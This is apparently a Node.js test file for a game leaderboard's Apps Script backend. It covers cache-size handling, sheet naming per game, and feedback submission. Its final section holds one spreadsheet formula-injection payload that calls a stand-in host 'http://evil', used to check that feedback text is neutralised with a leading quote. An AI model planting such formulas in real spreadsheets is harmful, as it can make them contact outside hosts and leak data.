const assert = require("assert");

// Minimal Apps Script global stubs so leaderboard-apps-script.js can be
// required and its sheet/cache functions exercised under plain Node.
global.CacheService = {
  getScriptCache() {
    return {
      get: () => null,
      put: (key, value) => {
        if (value.length > 100 * 1024) {
          throw new Error('Argument too large: value (line 56, file "leaderboard-apps-script")');
        }
      },
      remove: () => {},
    };
  },
};

function makeRow(i) {
  return [new Date(), "Player" + i, i, i, 0];
}

global.SpreadsheetApp = {
  getActiveSpreadsheet() {
    return {
      getSheetByName(name) {
        // Enough rows that the sorted JSON blows past CacheService's 100KB cap.
        const rowCount = 6000;
        const rows = [["Timestamp", "Name", "Score", "Flags", "Streak"]];
        for (let i = 1; i <= rowCount; i++) rows.push(makeRow(i));
        return {
          getDataRange() {
            return { getValues: () => rows };
          },
          getLastRow: () => rows.length,
        };
      },
      insertSheet() {
        throw new Error("insertSheet should not be needed in this test");
      },
    };
  },
};

const { sheetNamesFor_, getSortedAll_ } = require("./leaderboard-apps-script.js");

// Regression test: previously an oversized cache value crashed getSortedAll_
// (and therefore every doGet/doPost) instead of just skipping the cache.
const all = getSortedAll_("flags");
assert.strictEqual(all.length, 6000);
assert.strictEqual(all[0].score, 6000);

const flagsDefault = sheetNamesFor_(undefined);
assert.strictEqual(flagsDefault.scores, "Scores");
assert.strictEqual(flagsDefault.log, "PlayLog");

const flagsExplicit = sheetNamesFor_("flags");
assert.strictEqual(flagsExplicit.scores, "Scores");
assert.strictEqual(flagsExplicit.log, "PlayLog");

const capitals = sheetNamesFor_("capitals");
assert.strictEqual(capitals.scores, "CapitalScores");
assert.strictEqual(capitals.log, "CapitalPlayLog");

assert.notStrictEqual(flagsDefault.cacheKey, capitals.cacheKey);

const mathNames = sheetNamesFor_("math");
assert.strictEqual(mathNames.scores, "MathScores");
assert.strictEqual(mathNames.log, "MathPlayLog");
assert.notStrictEqual(mathNames.cacheKey, flagsDefault.cacheKey);
assert.notStrictEqual(mathNames.cacheKey, capitals.cacheKey);

console.log("All leaderboard-apps-script tests passed");

// --- feedback branch ---

global.ContentService = {
  MimeType: { JSON: "JSON" },
  createTextOutput(text) {
    return { text, setMimeType() { return this; } };
  },
};

const feedbackRows = [["Timestamp", "Game", "Rating", "Text", "Name"]];
global.SpreadsheetApp = {
  getActiveSpreadsheet() {
    return {
      getSheetByName(name) {
        return name === "Feedback" ? { appendRow: row => feedbackRows.push(row) } : null;
      },
      insertSheet() {
        throw new Error("insertSheet should not be needed — Feedback sheet stub already exists");
      },
    };
  },
};

const { doPost } = require("./leaderboard-apps-script.js");
const feedbackResult = doPost({
  postData: {
    contents: JSON.stringify({ type: "feedback", game: "capitals", rating: 5, text: "Great game!", name: "Alice" }),
  },
});
assert.strictEqual(feedbackRows.length, 2);
assert.strictEqual(feedbackRows[1][1], "capitals");
assert.strictEqual(feedbackRows[1][2], 5);
assert.strictEqual(feedbackRows[1][3], "Great game!");
assert.strictEqual(feedbackRows[1][4], "Alice");
assert.deepStrictEqual(JSON.parse(feedbackResult.text), { ok: true });

console.log("All feedback tests passed");

// --- feedback branch: formula-injection sanitization ---

const injectionText = '=IMPORTXML("http://evil", "//a")';
const injectionResult = doPost({
  postData: {
    contents: JSON.stringify({ type: "feedback", game: "capitals", rating: 5, text: injectionText, name: "Alice" }),
  },
});
assert.strictEqual(feedbackRows.length, 3);
assert.ok(feedbackRows[2][3].startsWith("'="), "formula-triggering text should be prefixed with a leading quote");
assert.strictEqual(feedbackRows[2][3], "'" + injectionText);
assert.deepStrictEqual(JSON.parse(injectionResult.text), { ok: true });

console.log("All formula-injection sanitization tests passed");
